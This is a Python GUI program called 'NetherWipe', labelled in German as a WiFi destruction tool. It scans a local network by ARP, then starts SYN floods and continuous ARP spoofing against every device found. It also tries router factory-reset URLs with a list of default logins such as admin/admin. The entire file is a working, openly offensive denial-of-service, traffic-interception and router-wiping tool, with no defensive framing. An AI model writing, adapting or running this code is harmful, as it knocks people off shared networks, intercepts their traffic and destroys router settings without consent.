#!/usr/bin/env python3
import subprocess
import sys
import threading
import time
import socket
import os
from tkinter import *
from tkinter import scrolledtext, messagebox
from scapy.all import IP, TCP, send, srp, ARP, Ether, conf
import random

conf.verb = 0

class NetherWipe:
    def __init__(self, root):
        self.root = root
        self.root.title("NetherWipe v1.1")
        self.root.geometry("600x500")
        self.root.configure(bg="#1e1e2e")
        self.running = True

        Label(root, text="NetherWipe – WiFi Zerstörungstool", font=("Helvetica", 16, "bold"), bg="#1e1e2e", fg="#ff5555").pack(pady=10)

        frame = Frame(root, bg="#1e1e2e")
        frame.pack(pady=10)

        Label(frame, text="Router IP:", bg="#1e1e2e", fg="white", font=("Helvetica", 12)).grid(row=0, column=0, padx=5)
        self.ip_entry = Entry(frame, width=20, font=("Helvetica", 12))
        self.ip_entry.grid(row=0, column=1, padx=5)
        self.ip_entry.insert(0, "192.168.1.1")

        self.go_button = Button(root, text="🔥 ZERSTÖREN 🔥", command=self.start_attack, bg="#ff5555", fg="white", font=("Helvetica", 14, "bold"))
        self.go_button.pack(pady=20)

        self.log_area = scrolledtext.ScrolledText(root, width=70, height=20, bg="#2d2d3a", fg="#00ff99", font=("Courier", 10))
        self.log_area.pack(pady=10)

        self.log("NetherWipe gestartet (kein hping3 – reine scapy DoS)")

    def log(self, msg):
        self.log_area.insert(END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_area.see(END)
        self.root.update()

    def get_network_range(self, router_ip):
        parts = router_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    def arp_scan(self, network):
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]
        return [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]

    def syn_flood(self, target_ip, duration=30):
        """ SYN Flood mit scapy – keine externen Tools """
        self.log(f"SYN Flood auf {target_ip} für {duration}s")
        end_time = time.time() + duration
        sport = random.randint(1024, 65535)
        while time.time() < end_time and self.running:
            ip = IP(dst=target_ip)
            tcp = TCP(sport=sport, dport=80, flags="S", seq=random.randint(1000, 5000))
            send(ip/tcp, verbose=0, count=1)
            sport = random.randint(1024, 65535)

    def arp_spoof(self, target_ip, router_ip):
        """ ARP-Spoofing mit scapy (kein arpspoof Befehl) """
        self.log(f"ARP-Spoofing gestartet: {target_ip} <-> {router_ip}")
        # Target MAC finden
        target_mac = self.get_mac(target_ip)
        router_mac = self.get_mac(router_ip)
        if not target_mac or not router_mac:
            self.log(f"MAC nicht gefunden für {target_ip} oder {router_ip}")
            return
        # ARP Antworten senden
        while self.running:
            send(ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac), verbose=0)
            send(ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac), verbose=0)
            time.sleep(2)

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        if ans:
            return ans[0][1].hwsrc
        return None

    def router_reset(self, router_ip):
        import requests
        from requests.auth import HTTPBasicAuth
        urls = [f"http://{router_ip}/cgi-bin/reboot?factory=1",
                f"http://{router_ip}/reset.htm",
                f"http://{router_ip}/goform/reset"]
        defaults = [("admin","admin"), ("admin",""), ("root","admin"), ("user","user")]
        for url in urls:
            for user,pw in defaults:
                try:
                    requests.get(url, auth=HTTPBasicAuth(user,pw), timeout=2)
                    self.log(f"Reset versucht: {url}")
                except:
                    pass

    def start_attack(self):
        router_ip = self.ip_entry.get().strip()
        if not router_ip:
            messagebox.showerror("Fehler", "Bitte Router IP eingeben")
            return
        self.go_button.config(state=DISABLED)
        self.running = True
        self.log(f"Starte Zerstörung auf Router {router_ip}")
        network = self.get_network_range(router_ip)
        self.log(f"Scanne {network}")
        devices = self.arp_scan(network)
        self.log(f"Gefunden: {len(devices)} Geräte")
        # Starte Flood auf jedes Gerät
        for dev in devices:
            threading.Thread(target=self.syn_flood, args=(dev['ip'], 60)).start()
            threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip)).start()
            time.sleep(0.5)
        threading.Thread(target=self.router_reset, args=(router_ip,)).start()
        self.log("Alle Angriffe gestartet. Systeme werden zerstört.")

    def stop(self):
        self.running = False
        self.log("Stoppe Angriffe...")

if __name__ == "__main__":
    root = Tk()
    app = NetherWipe(root)
    root.protocol("WM_DELETE_WINDOW", app.stop)
    root.mainloop()
